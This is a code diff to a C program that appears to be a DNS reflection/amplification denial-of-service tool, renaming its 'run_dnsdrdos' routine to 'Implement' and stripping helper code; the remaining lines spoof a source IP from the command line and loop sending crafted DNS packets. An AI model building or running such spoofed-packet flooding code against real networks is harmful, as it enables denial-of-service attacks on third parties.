@@ -11,26 +11,12 @@
 #include <netinet/udp.h>
 
 
-/* global settings */
-#define VERSION             "v0.1"
-#define ATOI(x)             strtol(x, (char **) NULL, 10)
-#define MAX_LEN             128     /* max line for dns server list */
-
-
 /* default settings */
 #define DEFAULT_SPOOF_ADDR  "127.0.0.1"
 #define DEFAULT_DOMAIN      "www.nctu.edu.tw"
 #define DEFAULT_DNS_PORT    53
 #define DEFAULT_LOOPS       10000
 
-
-/* error handling */
-#define __EXIT_FAILURE      exit(EXIT_FAILURE);
-#define __EXIT_SUCCESS      exit(EXIT_SUCCESS);
-
-#define __ERR_GEN do { fprintf(stderr,"[-] ERROR: " __FILE__ ":%u -> ",\
-                               __LINE__); fflush(stderr); perror(""); \
-    __EXIT_FAILURE } while (0)
 
 char *spoof_addr;
 typedef struct{
@@ -85,18 +71,6 @@ typedef struct {
 } bomb_t;
 
 
-/* just wrapper */
-/*void *xmalloc(size_t);
-void *xmemset(void *, int, size_t);
-int xsocket(int, int, int);
-void xclose(int);
-void xsendto(int, const void *, size_t, int, const struct sockaddr *,
-             socklen_t);*/
-/* prog stuff */
-
-void usage();
-
-
 void check_uid();
 
 /* net stuff */
@@ -109,46 +83,7 @@ bomb_t *build_dns_request(bomb_t *);
 void dns_name_format(char *, char *);
 bomb_t *build_packet(bomb_t *,  int);
 bomb_t *fill_sockaddr(bomb_t *);
-void run_dnsdrdos(int);
-void free_dnsdrdos();
-
-
-/* read in ip-addresses line by line *//*
-char **read_lines(char *file, unsigned int lines)
-{
-    FILE *fp = NULL;
-    char *buffer = NULL;
-    char **words = NULL;
-    int i = 0;
-
-
-    fp = open_file(file);
-
-    buffer = (char *) xmalloc(MAX_LEN);
-    words = (char **) xmalloc(lines * sizeof(char *));
-    buffer = xmemset(buffer, 0x00, MAX_LEN);
-
-    while (fgets(buffer, MAX_LEN, fp) != NULL) {
-        if ((buffer[strlen(buffer) - 1] == '\n') ||
-            (buffer[strlen(buffer) - 1] == '\r')) {
-            buffer[strlen(buffer) - 1] = 0x00;
-            words[i] = (char *) xmalloc(MAX_LEN - 1);
-            words[i] = xmemset(words[i], 0x00, MAX_LEN - 1);
-            strncpy(words[i], buffer, MAX_LEN - 1);
-            buffer = xmemset(buffer, 0x00, MAX_LEN - 1);
-            i++;
-        } else {
-            continue;
-        }
-    }
-    free(buffer);
-    fclose(fp);
-
-    return words;
-}
-*/
-
-
+void Implement(int);
 
 
 /* create raw socket */
@@ -330,7 +265,7 @@ bomb_t *fill_sockaddr(bomb_t *bomb)
 
 
 /* start action! */
-void run_dnsdrdos(int c)
+void Implement(int c)
 {
     printf("check2\n");
     bomb_t *bomb = NULL;
@@ -360,20 +295,18 @@ void run_dnsdrdos(int c)
 
 int main(int argc, char **argv)
 {
-    int c = 0;
+    int a = 0;
     unsigned int i = 0;
    
     printf("check0\n");
 
-    printf("%s\n",argv[1] );
+    printf("%s\n", argv[1]);
     spoof_addr = argv[1];
     printf("%s\n", spoof_addr);
     printf("check1\n");
     for (i = 0; i < 10; i++) {
-        
-            run_dnsdrdos( c);
-            printf("packet %d\n",i);
-        
+        Implement(a);
+        printf("packet %d\n",i);
     }
     printf("\n");
     
